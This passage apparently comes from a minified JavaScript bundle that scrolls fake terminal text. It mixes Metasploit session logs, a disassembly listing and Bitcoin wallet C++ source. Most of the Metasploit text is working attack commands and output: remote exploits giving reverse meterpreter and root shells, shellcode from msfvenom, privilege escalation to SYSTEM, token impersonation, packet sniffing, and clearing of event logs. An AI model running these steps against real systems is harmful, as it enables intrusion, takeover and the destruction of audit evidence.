tcp    vnc             open   \n172.16.194.172  6000   tcp    x11             open   \n172.16.194.172  6667   tcp    irc             open   \n172.16.194.172  8009   tcp    ajp13           open   \n172.16.194.172  8787   tcp                    open   \n172.16.194.172  45303  udp    rpc-status      open   \n172.16.194.172  45765  tcp    rpc-mountd      open   \n172.16.194.172  47161  tcp    rpc-nlockmgr    open   \n172.16.194.172  50410  tcp    rpc-status      open   \n172.16.194.172  52843  udp    rpc-nlockmgr    open   \n172.16.194.172  55269  udp    rpc-mountd      open \n\nmsf > vulns -p 22\n[*] Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.148 name=NSS-10267 refs=\n[*] Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.148 name=NSS-22964 refs=\n[*] Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.148 name=NSS-10881 refs=\n[*] Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.148 name=NSS-39520 refs=\n[*] Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.163 name=NSS-39520 refs=\n[*] Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.163 name=NSS-25221 refs=\n[*] Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.163 name=NSS-10881 refs=\n[*] Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.163 name=NSS-10267 refs=\n[*] Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.163 name=NSS-22964 refs=\n[*] Time: 2012-06-15 18:32:24 UTC Vuln: host=172.16.194.172 name=NSS-39520 refs=\n[*] Time: 2012-06-15 18:32:24 UTC Vuln: host=172.16.194.172 name=NSS-10881 refs=\n[*] Time: 2012-06-15 18:32:24 UTC Vuln: host=172.16.194.172 name=NSS-10267 refs=\n[*] Time: 2012-06-15 18:32:24 UTC Vuln: host=172.16.194.172 name=NSS-22964 refs=\n\nmsf > vulns 172.16.194.172 -p 6667\n[*] Time: 2012-06-15 18:32:23 UTC Vuln: host=172.16.194.172 name=NSS-11156 refs=\n[*] Time: 2012-06-15 18:32:23 UTC Vuln: host=172.16.194.172 name\n\nmsf  exploit(unreal_ircd_3281_backdoor) > exploit\n\n[*] Started reverse double handler\n[*] Connected to 172.16.194.172:6667...\n    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\n[*] Sending backdoor command...\n[*] Accepted the first client connection...\n[*] Accepted the second client connection...\n[*] Command: echo Q4SefN7pIVSQUL2F;\n[*] Writing to socket A\n[*] Writing to socket B\n[*] Reading from sockets...\n[*] Reading from socket B\n[*] B: "Q4SefN7pIVSQUL2F\\r\\n"\n[*] Matching...\n[*] A is input...\nifconfig\neth0      Link encap:Ethernet  HWaddr 00:0c:29:d1:62:80  \n          inet addr:172.16.194.172  Bcast:172.16.194.255  Mask:255.255.255.0\n          inet6 addr: fe80::20c:29ff:fed1:6280/64 Scope:Link\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n          RX packets:290453 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:402340 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000 \n          RX bytes:41602322 (39.6 MB)  TX bytes:344600671 (328.6 MB)\n          Interrupt:19 Base address:0x2000 \n\nlo        Link encap:Local Loopback  \n          inet addr:127.0.0.1  Mask:255.0.0.0\n          inet6 addr: ::1/128 Scope:Host\n          UP LOOPBACK RUNNING  MTU:16436  Metric:1\n          RX packets:774 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:774 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:0 \n          RX bytes:343253 (335.2 KB)  TX bytes:343253 (335.2 KB)\n\nid\nuid=0(root) gid=0(root)\n\nmsf > nessus_connect dook:s3cr3t@192.168.1.100\n[-] Warning: SSL connections are not verified in this release, it is possible fo\n[-]          with the ability to man-in-the-middle the Nessus traffic to capture\n[-]          credentials. If you are running this on a trusted network, please p\n[-]          as an additional parameter to this command.\nmsf > nessus_connect dook:s3cr3t@192.168.1.100 ok\n[*] Connecting to https://192.168.1.100:8834/ as dook\n[*] Authenticated\nmsf >\n\n\nmsf > nessus_policy_list\n[+] Nessus Policy List\n\nID  Name       Owner  visability\n--  ----       -----  ----------\n1   the_works  dook   private\n\nmsf >\n\nmsf > nessus_scan_new\n[*] Usage:\n[*]        nessus_scan_new policy id scan name targets\n[*]        use nessus_policy_list to list all available policies\nmsf > nessus_scan_new 1 pwnage 192.168.1.161\n[*] Creating scan from policy number 1, called "pwnage" and scanning 192.168.1.1\n[*] Scan started.  uid is 9d337e9b-82c7-89a1-a194-4ef154b82f624de2444e6ad18a1f\nmsf >\nmsf > nessus_scan_status\n[+] Running Scans\n\nScan ID                                               Name    Owner  Started    \n-------                                               ----    -----  -------    \n9d337e9b-82c7-89a1-a194-4ef154b82f624de2444e6ad18a1f  pwnage  dook   19:39 Sep 2\n\n[*] You can:\n[+]         Import Nessus report to database :     nessus_report_get reportid\n[+]         Pause a nessus scan :             nessus_scan_pause scanid\nmsf > nessus_scan_status\n[*] No Scans Running.\n[*] You can:\n[*]         List of completed scans:         nessus_report_list\n[*]         Create a scan:                   nessus_scan_new policy id scan name\n\nroot@kali:~# msfpescan -D -a 0x767a38f6 umpnpmgr.dll\n[umpnpmgr.dll]\n0x767a38f6 5f5ec3558bec6aff68003c7a7668e427\n00000000 5F                pop edi\n00000001 5E                pop esi\n00000002 C3                ret\n00000003 55                push ebp\n00000004 8BEC              mov ebp,esp\n00000006 6AFF              push byte -0x1\n00000008 68003C7A76        push 0x767a3c00\n0000000D 68                db 0x68\n0000000E E427              in al,0x27\n\nroot@kali:~# msfpescan -p umpnpmgr.dll\n[targetos.umpnpmgr.dll]\n0x79001567 pop eax; pop esi; ret\n0x79011e0b pop eax; pop esi; retn 0x0008\n0x79012749 pop esi; pop ebp; retn 0x0010\n0x7901285c pop edi; pop esi; retn 0x0004\n\nroot@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86\nFound 1 compatible encoders\nAttempting to encode payload with 1 iterations of x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 326 (iteration=0)\nx86/shikata_ga_nai chosen with final size 326\nPayload size: 326 bytes\nbuf = ""\nbuf += "\\xda\\xdc\\xd9\\x74\\x24\\xf4\\x5b\\xba\\xc5\\x5e\\xc1\\x6a\\x29"\n\nroot@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86\nFound 1 compatible encoders\nAttempting to encode payload with 1 iterations of x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 326 (iteration=0)\nx86/shikata_ga_nai chosen with final size 326\nPayload size: 326 bytes\nnotBuf = ""\nnotBuf += "\\xda\\xd1\\xd9\\x74\\x24\\xf4\\xbf\\xf0\\x1f\\xb8\\x27\\x5a"\n\nroot@kali:~# msfvenom --help-formats \nExecutable formats\nasp, aspx, aspx-exe, dll, elf, elf-so, exe, exe-only, exe-service, exe-small,\nhta-psh, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection,\npsh-cmd, vba, vba-exe, vba-psh, vbs, war\nTransform formats \nbash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, \npowershell, ps1, py, python, raw, rb, ruby, sh,\nvbapplication, vbscript\n\nroot@kali:/tmp# msfrop -x metsrv_gadgets metsrv.dll \nCollecting gadgets from metsrv.dll\nFound 4829 gadgets\n\nFound 4829 gadgets total\n\nExporting 4829 gadgets to metsrv_gadgets\nSuccess! gadgets exported to metsrv_gadgets\nroot@kali:/tmp# head -n 10 metsrv_gadgets \nAddress,Raw,Disassembly\n"0x10001098","5ec20c00","0x10001098: pop esi | 0x10001099: ret 0ch | "\n"0x100010f7","5ec20800","0x100010f7: pop esi | 0x100010f8: ret 8 | "\n"0x1000113d","5dc21800","0x1000113d: pop ebp | 0x1000113e: ret 18h | "\n"0x1000117a","5dc21c00","0x1000117a: pop ebp | 0x1000117b: ret 1ch | "\n"0x100011c3","5dc22800","0x100011c3: pop ebp | 0x100011c4: ret 28h | "\n"0x100018b5","5dc20c00","0x100018b5: pop ebp | 0x100018b6: ret 0ch | "\n"0x10002cb4","c00f9fc28d54","0x10002cb4: ror byte ptr [edi], 9fh | 0x10002cb7: r\n"0x10002df8","0483c20483","0x10002df8: add al, -7dh | 0x10002dfa: ret 8304h | "\n"0x10002e6e","080bc20fb6","0x10002e6e: or [ebx], cl | 0x10002e70: ret 0b60fh | "\nroot@kali:/tmp#\n\nmsf auxiliary(fuzz_imap) > run\n\n[*] Connecting to IMAP server 172.16.30.7:143...\n[*] Connected to target IMAP server.\n[*] Authenticating as test with password test...\n[*] Generating fuzzed data...\n[*] Sending fuzzed data, buffer length = 1012\n[*] 0002 LIST () /"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]BBBBCCCC" "PWNED"\n[*] Connecting to IMAP server 172.16.30.7:143...\n[*] Connected to target IMAP server.\n[*] Authenticating as test with password test...\n[*] Authentication failed\n[*] It seems that host is not responding anymore and this is G00D ;)\n[*] Auxiliary module execution completed\nmsf auxiliary(fuzz_imap) >\n\nmsf exploit(surgemail_list) > set PAYLOAD windows/meterpreter/bind_tcp\nPAYLOAD => windows/meterpreter/bind_tcp\nmsf exploit(surgemail_list) > exploit\n\n[*] Connecting to IMAP server 172.16.30.7:143...\n[*] Started bind handler\n[*] Connected to target IMAP server.\n[*] Authenticating as test with password test...\n[*] Sending payload\n[*] Transmitting intermediate stager for over-sized stage...(191 bytes)\n[*] Sending stage (2650 bytes)\n[*] Sleeping before handling stage...\n[*] Uploading DLL (75787 bytes)...\n[*] Upload completed.\n[*] Meterpreter session 1 opened (172.16.30.34:63937 -> 172.16.30.7:4444)\n\nmeterpreter > execute -f cmd.exe -c -i\nProcess 672 created.\nChannel 1 created.\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.\n\n def exploit\n    buff = "\\x41" * 174\n    buff >> "\\xeb\\x06\\x41\\x41"\n    buff >> [target.ret].pack(\'V\')\n    buff >> "\\xCC" * 2000\n    print_status("Creating \'#{datastore[\'FILENAME\']}\' file ...")\n    file_create(buff)\n end\n\n msf exploit(audacity) > use multi/handler\nmsf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nmsf exploit(handler) > set LHOST 192.168.2.15\nLHOST => 192.168.2.15\nmsf exploit(handler) > exploit\n\n[*] Handler binding to LHOST 0.0.0.0\n[*] Started reverse handler\n[*] Starting the payload handler...\n[*] Sending stage (718336 bytes)\n[*] Meterpreter session 1 opened (192.168.2.15:4444 -> 192.168.2.109:1445)\n\nmeterpreter >\n\nmsf exploit(a-pdf_wav_to_mp3) > use exploit/multi/handler\nmsf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nmsf exploit(handler) > set LHOST 192.168.1.101\nLHOST => 192.168.1.101\nmsf exploit(handler) > exploit\n\n[*] Started reverse handler on 192.168.1.101:4444\n[*] Starting the payload handler...\n[*] Sending stage (748544 bytes) to 192.168.1.160\n[*] Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.160:53983) at \n\nmeterpreter > sysinfo\nComputer: XEN-XP-PATCHED\nOS      : Windows XP (Build 2600, Service Pack 3).\nArch    : x86\nLanguage: en_US\nmeterpreter> getuid\nServer username: XEN-XP-PATCHED\\Administrator\nmeterpreter>\n\nmsf exploit(ms10_002_aurora) >\n[*] Sending Internet Explorer "Aurora" Memory Corruption to client 192.168.1.161\n[*] Sending stage (748544 bytes) to 192.168.1.161\n[*] Meterpreter session 3 opened (192.168.1.71:38699 -> 192.168.1.161:4444) at 2\n\nmsf exploit(ms10_002_aurora) > sessions -i 3\n[*] Starting interaction with 3...\n\nmeterpreter > getuid\nServer username: XEN-XP-SP2-BARE\\victim\nmeterpreter >\nmeterpreter > background\n[*] Backgrounding session 1...\nmsf exploit(ms10_002_aurora) > use exploit/windows/local/\nuse exploit/windows/local/bypassuac\nuse exploit/windows/local/bypassuac_injection\nuse exploit/windows/local/ms10_015_kitrap0d\nuse exploit/windows/local/ms10_092_schelevator\nuse exploit/windows/local/ms11_080_afdjoinleaf\nuse exploit/windows/local/ms13_005_hwnd_broadcast\nuse exploit/windows/local/ms13_081_track_popup_menu\nmsf exploit(ms10_002_aurora) >\n\nmsf exploit(ms10_002_aurora) > use exploit/windows/local/ms10_015_kitrap0d\nmsf exploit(ms10_015_kitrap0d) > set SESSION 1\nmsf exploit(ms10_015_kitrap0d) > set PAYLOAD windows/meterpreter/reverse_tcp\nmsf exploit(ms10_015_kitrap0d) > set LHOST 192.168.1.161\nmsf exploit(ms10_015_kitrap0d) > set LPORT 4443\nmsf exploit(ms10_015_kitrap0d) > show options\n\nModule options (exploit/windows/local/ms10_015_kitrap0d):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   SESSION  1                yes       The session to run this module on.\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (accepted: seh, thread, p\n   LHOST     192.168.1.161    yes       The listen address\n   LPORT     4443             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows 2K SP4 - Windows 7 (x86)\n\nmsf exploit(ms10_015_kitrap0d) > exploit\n\n[*]  Started reverse handler on 192.168.1.161:4443 \n[*]  Launching notepad to host the exploit...\n[+]  Process 4048 launched.\n[*]  Reflectively injecting the exploit DLL into 4048...\n[*]  Injecting exploit into 4048 ...\n[*]  Exploit injected. Injecting payload into 4048...\n[*]  Payload injected. Executing exploit...\n[+]  Exploit finished, wait for (hopefully privileged) payload execution to comp\n[*]  Sending stage (769024 bytes) to 192.168.1.71\n[*]  Meterpreter session 2 opened (192.168.1.161:4443 -> 192.168.1.71:49204) at \n\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter >\n\nmsf exploit(warftpd_165_user) > exploit\n\n[*] Handler binding to LHOST 0.0.0.0\n[*] Started reverse handler\n[*] Connecting to FTP server 172.16.104.145:21...\n[*] Connected to target FTP server.\n[*] Trying target Windows 2000 SP0-SP4 English...\n[*] Transmitting intermediate stager for over-sized stage...(191 bytes)\n[*] Sending stage (2650 bytes)\n[*] Sleeping before handling stage...\n[*] Uploading DLL (75787 bytes)...\n[*] Upload completed.\n[*] Meterpreter session 2 opened (172.16.104.130:4444 -> 172.16.104.145:1246)\n\nmeterpreter > irb\n[*] Starting IRB shell\n[*] The \'client\' variable holds the meterpreter client\n>> log = client.sys.eventlog.open(\'system\')\n=> #>#:0xb6779424 @client=#>, #>, #\n\nmsf exploit(warftpd_165_user) > exploit\n\n[*] Handler binding to LHOST 0.0.0.0\n[*] Started reverse handler\n[*] Connecting to FTP server 172.16.104.145:21...\n[*] Connected to target FTP server.\n[*] Trying target Windows 2000 SP0-SP4 English...\n[*] Transmitting intermediate stager for over-sized stage...(191 bytes)\n[*] Sending stage (2650 bytes)\n[*] Sleeping before handling stage...\n[*] Uploading DLL (75787 bytes)...\n[*] Upload completed.\n[*] Meterpreter session 1 opened (172.16.104.130:4444 -> 172.16.104.145:1253)\n\nmeterpreter > run clearlogs\nClearing Event Logs, this will leave an event 517\n[*] Clearing the security Event Log\n[*] Clearing the system Event Log\n[*] Clearing the application Event Log\n[*] Clearing the directory service Event Log\n[*] Clearing the dns server Event Log\n[*] Clearing the file replication service Event Log\nAll Clear! You are a Ninja!\nmeterpreter > exit\n\nmsf > use exploit/windows/smb/ms08_067_netapi\nmsf exploit(ms08_067_netapi) > set RHOST 10.211.55.140\nRHOST => 10.211.55.140\nmsf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nmsf exploit(ms08_067_netapi) > set LHOST 10.211.55.162\nLHOST => 10.211.55.162\nmsf exploit(ms08_067_netapi) > set LANG english\nLANG => english\nmsf exploit(ms08_067_netapi) > show targets\n\nmsf exploit(ms08_067_netapi) > set TARGET 8\ntarget => 8\nmsf exploit(ms08_067_netapi) > exploit\n\n[*] Handler binding to LHOST 0.0.0.0\n[*] Started reverse handler\n[*] Triggering the vulnerability...\n[*] Transmitting intermediate stager for over-sized stage...(191 bytes)\n[*] Sending stage (2650 bytes)\n[*] Sleeping before handling stage...\n[*] Uploading DLL (75787 bytes)...\n[*] Upload completed.\n[*] Meterpreter session 1 opened (10.211.55.162:4444 -> 10.211.55.140:1028)\n\nmeterpreter > list_tokens -u\n\nDelegation Tokens Available\n========================================\nNT AUTHORITY\\LOCAL SERVICE\nNT AUTHORITY\\NETWORK SERVICE\nNT AUTHORITY\\SYSTEM\nSNEAKS.IN\\Administrator\n\nImpersonation Tokens Available\n========================================\nNT AUTHORITY\\ANONYMOUS LOGON\n\nmeterpreter > impersonate_token SNEAKS.IN\\\\Administrator\n[+] Delegation token available\n[+] Successfully impersonated user SNEAKS.IN\\Administrator\nmeterpreter > getuid\nServer username: SNEAKS.IN\\Administrator\nmeterpreter >\n\nmeterpreter > shell\nProcess 2804 created.\nChannel 1 created.\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.\n\nC:\\WINDOWS\\system32> whoami\nwhoami\nSNEAKS.IN\\administrator\n\nmsf > use exploit/windows/smb/ms08_067_netapi\nmsf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpeter/reverse_tcp\nmsf exploit(ms08_067_netapi) > set LHOST 10.211.55.126\nmsf exploit(ms08_067_netapi) > set RHOST 10.10.1.119\nmsf exploit(ms08_067_netapi) > exploit\n\n[*] Handler binding to LHOST 0.0.0.0\n[*] Started reverse handler\n[*] Triggering the vulnerability...\n[*] Transmitting intermediate stager for over-sized stage...(216 bytes)\n[*] Sending stage (205824 bytes)\n[*] Meterpreter session 1 opened (10.10.1.4:4444 -> 10.10.1.119:1921)\n\nmeterpreter > sniffer_start 2\n[*] Capture started on interface 2 (50000 packet buffer)\n\nmeterpreter > sniffer_dump 2 /tmp/all.cap\n[*] Dumping packets from interface 2...\n[*] Wrote 19 packets to PCAP file /tmp/all.cap\n\nmeterpreter > sniffer_stats 2\n[*] Capture statistics for interface 2\n        packets: 4632\n        bytes: 1978363\n\nmeterpreter > sniffer_dump 2 /tmp/all.cap\n[*] Flushing packet capture buffer for interface 2...\n[*] Flushed 5537 packets (3523012 bytes)\n[*] Downloaded 014% (524288/3523012)...\n[*] Downloaded 029% (1048576/3523012)...\n[*] Downloaded 044% (1572864/3523012)...\n[*] Downloaded 059% (2097152/3523012)...\n[*] Downloaded 074% (2621440/3523012)...\n[*] Downloaded 089% (3145728/3523012)...\n[*] Downloaded 100% (3523012/3523012)...\n[*] Download completed, converting to PCAP...\n[-] Corrupted packet data (length:10359)\n[*] PCAP file written to /tmp/all.cap\n\nmeterpreter > sniffer_stop 2\n[*] Capture stopped on interface 2\n[*] There are 279 packets (57849 bytes) remaining\n[*] Download or release them using \'sniffer_dump\' or \'sniffer_release\'\n\nmeterpreter > sniffer_release 2\n[*] Flushed 279 packets (57849 bytes) from interface 2\nmeterpreter >\n\nmeterpreter > ipconfig\n\nCitrix XenServer PV Ethernet Adapter\nHardware MAC: 22:73:ff:12:11:4b\nIP Address  : 10.1.13.2\nNetmask     : 255.255.255.0\n\nMS TCP Loopback interface\nHardware MAC: 00:00:00:00:00:00\nIP Address  : 127.0.0.1\nNetmask     : 255.0.0.0\n\nmeterpreter >\n')},get dt(){return delete this.dt,this.dt=810}}]}},{numCols:25,zIndex:0,get streams(){return[{get title(){delete this.title;return this.title=x(["Assembly","Disassembler","ASM","Objdump -d"])},get stream(){return delete this.stream,this.stream=E("nopw   0x0(%rax,%rax,1)\nlea    0x8587(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7358\nnopl   0x0(%rax)\nretq\nnopl   0x0(%rax)\nmov    0xd8b1(%rip),%rbp\nmov    %rbp,%rdi\nlea    0x889c(%rip),%rsi\ncallq  1170\npop    %rbp\nmov    %rax,0xd052(%rip)\nretq\nnop\nlea    0x8874(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7d24\nnopl   0x0(%rax)\nlea    0x8848(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7ceb\nnopl   0x0(%rax)\nlea    0x8812(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7cb2\nnopl   0x0(%rax)\nlea    0x87e2(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7c79\nnopl   0x0(%rax)\nlea    0x87b0(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7c40\nnopl   0x0(%rax)\nlea    0x877f(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7c07\nnopl   0x0(%rax)\nlea    0x8751(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7bce\nnopl   0x0(%rax)\nlea    0x8721(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7b95\nnopl   0x0(%rax)\nlea    0x86ee(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7b5c\nnopl   0x0(%rax)\nlea    0x86be(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7b23\nnopl   0x0(%rax)\nlea    0x8693(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7aea\nnopl   0x0(%rax)\nlea    0x8669(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7ab1\nnopl   0x0(%rax)\nlea    0x863d(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7a78\nnopl   0x0(%rax)\nlea    0x860b(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7a3f\nnopl   0x0(%rax)\nlea    0x85db(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7a06\nnopl   0x0(%rax)\nlea    0x85a9(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   79cd\nnopl   0x0(%rax)\nlea    0xa481(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7994\nnopl   0x0(%rax)\nlea    0xa449(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   795b\nnopl   0x0(%rax)\nlea    0x854c(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7922\nnopl   0x0(%rax)\nlea    0xa3f9(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   78e9\nnopl   0x0(%rax)\nlea    0x850d(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   78b0\nnopl   0x0(%rax)\nlea    0x84e0(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7877\nnopl   0x0(%rax)\nlea    0x84b3(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   783e\nnopl   0x0(%rax)\nlea    0x8486(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7805\nnopl   0x0(%rax)\nlea    0x8459(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   77cc\nnopl   0x0(%rax)\nlea    0x842c(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7793\nnopl   0x0(%rax)\nlea    0x83ff(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   775a\nnopl   0x0(%rax)\nlea    0x83d4(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7721\nnopl   0x0(%rax)\nlea    0x83a9(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   76e8\nnopl   0x0(%rax)\nlea    0x837e(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   76af\nnopl   0x0(%rax)\nlea    0x8359(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7676\nnopl   0x0(%rax)\nlea    0x8334(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   763d\nnopl   0x0(%rax)\nlea    0x830f(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7604\nnopl   0x0(%rax)\nlea    0x82ea(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   75cb\nnopl   0x0(%rax)\nlea    0x82c6(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7592\nnopl   0x0(%rax)\nlea    0x82a2(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7559\nnopl   0x0(%rax)\nlea    0x827e(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7520\nnopl   0x0(%rax)\nlea    0x825a(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   74e7\nnopl   0x0(%rax)\nlea    0x822b(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   74ae\nnopl   0x0(%rax)\nlea    0x81fe(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7475\nnopl   0x0(%rax)\nlea    0x81d1(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   743c\nnopl   0x0(%rax)\nlea    0x81ac(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7403\nnopl   0x0(%rax)\nlea    0x817b(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   73ca\nnopl   0x0(%rax)\nlea    0x8152(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   7391\nxor    %eax,%eax\njmpq   a5eb\nxor    %eax,%eax\njmpq   a5eb\nxor    %eax,%eax\njmpq   993a\nxor    %eax,%eax\njmpq   9a57\nxor    %eax,%eax\njmpq   a482\nxor    %eax,%eax\njmpq   a06d\nxor    %eax,%eax\njmpq   a89e\nnopl   0x0(%rax)\nlea    0x4dde(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   c8b9\nnopl   0x0(%rax)\nlea    0x4db9(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   c880\nnopl   0x0(%rax)\nlea    0x4d96(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   c847\nnopl   0x0(%rax)\nlea    0x4d71(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   c80e\nnopl   0x0(%rax)\nlea    0x4d49(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   c7d5\nnopl   0x0(%rax)\nlea    0x4d24(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   c79c\nnopl   0x0(%rax)\nlea    0x4cf8(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   c763\nnopl   0x0(%rax)\nlea    0x4ccd(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   c72a\nnopl   0x0(%rax)\nlea    0x4ca8(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   c6f1\nnopl   0x0(%rax)\nlea    0x4c85(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   c6b8\nnopl   0x0(%rax)\nlea    0x4c60(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   c67f\nnopl   0x0(%rax)\nlea    0x4c3e(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   c646\nnopl   0x0(%rax)\nlea    0x4c16(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   c60d\nnopl   0x0(%rax)\nlea    0x4bf1(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   c5d4\nnopl   0x0(%rax)\nmov    0x80a9(%rip),%rbp\nlea    0x4bc2(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   c586\nnopl   0x0(%rax,%rax,1)\nlea    0x4b9c(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   c554\nnopl   0x0(%rax)\nlea    0x4b71(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   c51b\nnopl   0x0(%rax)\nlea    0x4b47(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   c4e2\nnopl   0x0(%rax)\nlea    0x4b1c(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   c4a9\nnopl   0x0(%rax)\nlea    0x4af2(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   c470\nnopl   0x0(%rax)\nlea    0x4ac6(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\njmpq   c437\nnopl   0x0(%rax)\nlea    0x4a9c(%rip),%rsi\nmov    %rbp,%rdi\ncallq  1170\n")},get dt(){return delete this.dt,this.dt=v(30,150)}}]}},{numCols:81,get streams(){return[{get title(){delete this.title;return this.title=x(["Bitcoin - wallet.cpp","Editor - CPP","C++"])},get stream(){return delete this.stream,this.stream=E('// Copyright (c) 2009-2010 Satoshi Nakamoto\n// Copyright (c) 2009-2021 The Bitcoin Core developers\n// Distributed under the MIT software license, see the accompanying\n// file COPYING or http://www.opensource.org/licenses/mit-license.php.\n\n#include <fs.h>\n#include <wallet/bdb.h>\n#include <wallet/db.h>\n\n#include <util/strencodings.h>\n#include <util/translation.h>\n\n#include <stdint.h>\n\n#ifndef WIN32\n\n#include <sys/stat.h>\n\n#endif\n\nnamespace wallet {\nnamespace {\n\nvoid CheckUniqueFileid(const BerkeleyEnvironment &env,\n                       const std::string &filename, Db &db,\n                       WalletDatabaseFileId &fileid) {\n  if (env.IsMock()) return;\n\n  int ret = db.get_mpf()->get_fileid(fileid.value);\n  if 